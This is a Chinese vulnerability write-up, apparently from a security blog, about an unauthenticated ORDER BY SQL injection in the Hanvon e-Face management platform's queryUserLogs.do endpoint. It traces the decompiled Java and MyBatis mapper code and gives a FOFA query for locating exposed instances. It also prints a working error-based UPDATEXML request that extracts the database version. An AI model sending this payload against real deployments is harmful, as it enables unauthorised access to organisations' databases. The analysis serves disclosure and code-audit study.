---
title: "汉王e脸通综合管理平台 queryUserLogs.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryUserLogs-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-queryuserlogs.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryUserLogs.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/27 08:35
- 860浏览
- [0评论](#comment)
- 60分钟阅读

深入探索

认证

鉴权

软件

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryUserLogs.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入检测工具

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `SystemLogMgrController` 里关于 `queryUserLogs` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/queryUserLogs.do"},
        method = {RequestMethod.GET}
    )
    public RequestJson queryUserLogs(@RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "name") String name, @RequestParam(required = false,value = "begin") String begin, @RequestParam(required = false,value = "end") String end, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order) {
        RequestJson result = new RequestJson();

        try {
            this.loginCheck();
            DbPager pager = this.getPager(page, pageSize, columnKey, order);
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            if (begin == null || end == null) {
                Calendar cale = Calendar.getInstance();
                cale.add(2, 0);
                cale.set(5, 1);
                begin = sdf.format(cale.getTime());
                cale.add(2, 1);
                cale.set(5, 0);
                end = sdf.format(cale.getTime());
            }

            Date begin1 = sdf.parse(begin);
            Date end1 = sdf.parse(end);
            begin1 = WorkDateUtils.getStartOfDay(begin1);
            end1 = WorkDateUtils.getEndOfDay(end1);
            Timestamp beginTime = new Timestamp(begin1.getTime());
            Timestamp endTime = new Timestamp(end1.getTime());
            if (name != null && name.trim().length() > 0) {
                name.trim();
            }

            List<UserLogTpm> list = (List)this.logAsm.queryUserLog(beginTime, endTime, name, pager).getResult();
```

深入探索

SQL注入防护

在线安全工具

网络安全培训

跟进`queryUserLog`方法

```
public List<UserLogTpm> queryUserLog(Timestamp beginTime, Timestamp endTime, String queryText, DbPager pager) {
        if (pager == null) {
            pager = new DbPager();
        }

        SimpleDateFormat fmt = new SimpleDateFormat("yyyy-MM-dd");

        try {
            beginTime = new Timestamp(fmt.parse(fmt.format(beginTime)).getTime());
            endTime = new Timestamp(fmt.parse(fmt.format(endTime)).getTime() + 86400000L - 1L);
        } catch (Exception var10) {
        }

        SessionalUser su = TheApp.getCurrentUser();
        Long currentUserId = su.getId();
        if (this.systemBsm.hasAdminRole(currentUserId)) {
            currentUserId = null;
        }

        int totalCount = this.logDsm.queryUserLogCount(beginTime, endTime, queryText, currentUserId, pager);
        pager.setRecordCount(totalCount);
        List<UserLogTpm> logList = this.logDsm.queryUserLog(beginTime, endTime, queryText, currentUserId, pager);
        return logList;
    }
```

继续跟进`queryUserLog`方法

```
public interface LogDsm {
    List<UserLogTpm> queryUserLog(@Param("beginTime") Timestamp var1, @Param("endTime") Timestamp var2, @Param("queryText") String var3, @Param("currentUserId") Long var4, @Param("pager") DbPager var5);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 LogDsm.xml

代码安全审计

```
<!-- 查询户日志 -->
    <select id="queryUserLog" resultType="userLogTpm">
        SELECT
        ul.ng_id,
        ul.ng_id as id,
        ul.nt_type as 'type',
        ul.nt_sub_type as subType,
        ul.nt_result as result,
        ul.ts_log as logTime,
        ul.sz_server_code as serverCode,
        ul.sz_title as title,
        ul.tx_comment as comment,
        ul.ng_user_id userId,
        u.sz_name as userName,
        u.sz_employ_id as employId
        FROM sys_user_log ul
        LEFT JOIN sys_user u ON u.ng_id = ul.ng_user_id
        LEFT JOIN sys_user_branch ub on u.ng_id = ub.ng_user_id
        LEFT JOIN sys_branch b on ub.ng_branch_id = b.ng_id
        WHERE ul.ts_log BETWEEN #{beginTime} AND #{endTime}
        <if test="queryText != null and queryText.trim().length() > 0">
            AND (
              u.sz_name LIKE concat('%',#{queryText},'%')
              OR u.sz_employ_id LIKE concat('%',#{queryText},'%')
              OR ul.sz_title LIKE concat('%',#{queryText},'%')
              OR ul.tx_comment LIKE concat('%',#{queryText},'%')
            )
        </if>
        <if test="currentUserId != null">
            AND (b.ng_id IN (
                select distinct ng_branch_id
                from sys_branch_role br
                inner join sys_role r on br.ng_role_id = r.ng_id
                inner join sys_user_role ur on ur.ng_role_id = r.ng_id
                where ur.ng_user_id = #{currentUserId}
            )
            OR ul.ng_user_id = #{currentUserId})
        </if>
        <choose>
            <when test="pager.dbSorts != null and pager.dbSorts.size() > 0">
                <foreach item="item" collection="pager.dbSorts" open="order by " separator=",">
                    ${item.sortField} ${item.sortMode}
                </foreach>
            </when>
            <otherwise>
                order by ts_log desc
            </otherwise>
        </choose>
        limit ${(pager.pageIndex - 1) * pager.pageSize}, ${pager.pageSize}
    </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/systemLogMgr/queryUserLogs.do?branchId=1&columnKey=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357))&deviceName=test&id=1&order=desc&page=1&pageSize=10&pointName=1&recoToken=SGUsqvF7cVS HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 queryUserLogs.do SQL注入漏洞](images/img-001-1347bcf3622e.webp)](https://image.mrxn.net/c8ad718021ab419dafb28e6d40e7ff87.webp)

成功利用报错注入获取到数据库版本号信息

漏洞修复方案

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
